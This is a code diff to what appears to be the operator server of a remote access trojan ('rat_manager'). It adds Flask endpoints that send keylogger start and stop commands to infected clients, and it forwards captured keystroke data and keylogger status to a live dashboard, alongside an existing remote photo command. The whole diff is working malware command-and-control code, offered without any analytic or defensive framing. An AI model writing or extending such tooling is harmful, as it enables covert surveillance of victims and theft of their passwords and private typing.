@@ -181,6 +181,20 @@ class ClientHandler(threading.Thread):
                 'timestamp': time.time()
             })
             
+        elif msg_type == ResponseTypes.KEYLOG_DATA:
+            payload = parsed.get('payload', {})
+            socketio.emit('keylog_data', {
+                'client_id': self.client_id,
+                'payload': payload
+            })
+            
+        elif msg_type == ResponseTypes.KEYLOG_STATUS:
+            payload = parsed.get('payload', {})
+            socketio.emit('keylog_status', {
+                'client_id': self.client_id,
+                'payload': payload
+            })
+            
         elif msg_type == ResponseTypes.ERROR:
             socketio.emit('client_error', {
                 'client_id': self.client_id,
@@ -286,6 +300,28 @@ def send_photo_command():
     
     if rat_manager.send_command_to_client(client_id, Commands.PHOTO):
         return jsonify({'status': 'success', 'message': 'Photo command sent'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Failed to send command'})
+
+@app.route('/api/command/keylog_start', methods=['POST'])
+def send_keylog_start_command():
+    """Send keylog start command to client"""
+    data = request.json
+    client_id = data.get('client_id')
+    
+    if rat_manager.send_command_to_client(client_id, Commands.KEYLOG_START):
+        return jsonify({'status': 'success', 'message': 'Keylogger start command sent'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Failed to send command'})
+
+@app.route('/api/command/keylog_stop', methods=['POST'])
+def send_keylog_stop_command():
+    """Send keylog stop command to client"""
+    data = request.json
+    client_id = data.get('client_id')
+    
+    if rat_manager.send_command_to_client(client_id, Commands.KEYLOG_STOP):
+        return jsonify({'status': 'success', 'message': 'Keylogger stop command sent'})
     else:
         return jsonify({'status': 'error', 'message': 'Failed to send command'})
 
